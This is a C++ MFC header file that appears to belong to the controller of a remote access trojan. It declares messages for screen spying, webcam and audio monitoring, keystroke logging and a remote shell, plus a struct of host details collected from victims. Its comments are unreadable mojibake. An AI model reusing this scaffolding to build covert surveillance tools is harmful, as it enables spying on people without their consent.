// stdafx.h : include file for standard system include files,
//  or project specific include files that are used frequently, but
//      are changed infrequently
//

#if !defined(AFX_STDAFX_H__4B858A7B_A54D_460A_A51B_CD810BB0B803__INCLUDED_)
#define AFX_STDAFX_H__4B858A7B_A54D_460A_A51B_CD810BB0B803__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
#define NO_WARN_MBCS_MFC_DEPRECATION // warning C4996: 'MBCS_Support_Deprecated_In_MFC': MBCS support in MFC is deprecated and may be removed in a future version of MFC.
#define VC_EXTRALEAN		// Exclude rarely-used stuff from Windows headers
#define _WIN32_WINNT 0x0A00 
#include <afxwin.h>         // MFC core and standard components
#include <afxext.h>         // MFC extensions
#include <afxcview.h>
#include <afxdisp.h>        // MFC Automation classes
#include <afxdtctl.h>		// MFC support for Internet Explorer 4 Common Controls
#ifndef _AFX_NO_AFXCMN_SUPPORT
#include <afxcmn.h>			// MFC support for Windows Common Controls
#endif // _AFX_NO_AFXCMN_SUPPORT


#include <afxtempl.h>
#include <winsock2.h>
#include <winioctl.h>
#define MFCXLIB_STATIC 
#include <CJ60Lib.h>		// CJ60 Library components

#include "include\IOCPServer.h"
#include "macros.h"
#include "vfw.h" // DrawDibOpen
#pragma comment(lib, "vfw32.lib")

enum 
{
	WM_CLIENT_CONNECT = WM_APP + 0x1001,
	WM_CLIENT_CLOSE,
	WM_CLIENT_NOTIFY,
	WM_DATA_IN_MSG,
	WM_DATA_OUT_MSG,

	
	WM_ADDTOLIST = WM_USER + 102,	// �K�[��C����Ϥ�
	WM_REMOVEFROMLIST,				// �q�C����Ϥ��R��
	WM_OPENMANAGERDIALOG,			// ���}�@�Ӥ��޲z���f
	WM_OPENSCREENSPYDIALOG,			// ���}�@�ӫ̹��ʵ����f
	WM_OPENWEBCAMDIALOG,			// ���}�ṳ�Y�ʵ����f
	WM_OPENAUDIODIALOG,				// ���}�@�ӻy����ť���f
	WM_OPENKEYBOARDDIALOG,			// ���}��L�O�����f
	WM_OPENPSLISTDIALOG,			// ���}�i�{�޲z���f
	WM_OPENSHELLDIALOG,				// ���}shell���f
	WM_RESETPORT,					// ���ܺݤf
//////////////////////////////////////////////////////////////////////////
	FILEMANAGER_DLG = 1,
	SCREENSPY_DLG,
	WEBCAM_DLG,
	AUDIO_DLG,
	KEYBOARD_DLG,
	SYSTEM_DLG,
	SHELL_DLG
};

typedef struct
{	
	BYTE			bToken;			// = 1
	OSVERSIONINFOEX	OsVerInfoEx;	// �����H��
	int				CPUClockMhz;	// CPU�D�W
	IN_ADDR			IPAddress;		// �s�x32�쪺IPv4���a�}�ƾڵ��c
	char			HostName[50];	// �D���W
	bool			bIsWebCam;		// �O�_���ṳ�Y
	DWORD			dwSpeed;		// ���t
}LOGININFO;

typedef struct 
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
}FILESIZE;

#define MAKEINT64(low, high) ((unsigned __int64)(((DWORD)(low)) | ((unsigned __int64)((DWORD)(high))) << 32))

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_STDAFX_H__4B858A7B_A54D_460A_A51B_CD810BB0B803__INCLUDED_)
